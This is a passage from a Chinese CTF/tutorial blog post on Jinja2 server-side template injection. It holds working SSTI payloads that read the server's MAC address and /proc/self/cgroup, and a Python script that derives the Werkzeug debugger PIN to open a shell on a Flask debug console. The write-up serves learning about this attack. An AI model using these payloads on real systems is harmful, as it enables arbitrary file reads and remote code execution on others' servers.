+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/sys/class/net/eth0/address&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain"> 02:42:ac:10:93:07<br>将：去掉<br>0242ac109307<br>在python中进行转化<br>print(int(&#x27;0242ac109307&#x27;,16))<br>得到<br>2485377864455<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>docker机器的id</li>
+</ol>
+<p><strong>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件。</strong></p>
+<p><strong>对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，</strong></p>
+ <figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/proc/self/cgroup&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p> 得到docker机器id，也就是**1:name&#x3D;systemd:&#x2F;docker&#x2F;**之后的字符串  </p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180942356.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>生成pin码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span><span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485377864455&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;ad4fc7650590f81ec6ab4e3a40f284a6b5a75454fcb50d6ee5347eba94a124c8&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br><br></code></pre></td></tr></table></figure>
+
+<p>结果：199-196-476</p>
+<h3 id="传入PIN码，终端RCE"><a href="#传入PIN码，终端RCE" class="headerlink" title="传入PIN码，终端RCE"></a>传入PIN码，终端RCE</h3><p>然后在报错的界面，点击窗口栏，输入PIN</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945927.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 输入PIN码  </p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945956.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 终端shell  </p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180944005.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180945378.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>polarctf  flask_pin</p>
+<p>进入题目是一个python的flsak debug环境界面，存在pin码输入的情况。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="category-chain-item">模板注入</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/SSTI/">#SSTI</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SSTI模板注入</div>
+      <div>http://example.com/2023/04/13/SSTI模板注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>April 13, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/06/web%E5%9F%BA%E7%A1%80%E7%AF%87/" title="web基础篇">
+                        <span class="hidden-mobile">web基础篇</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="http://140.210.217.83/" target="_blank" rel="nofollow noopener"><span>推荐</span></a> <i class="iconfont icon-love"></i> <a href="http://140.210.217.83/" target="_blank" rel="nofollow noopener"><span>博客</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
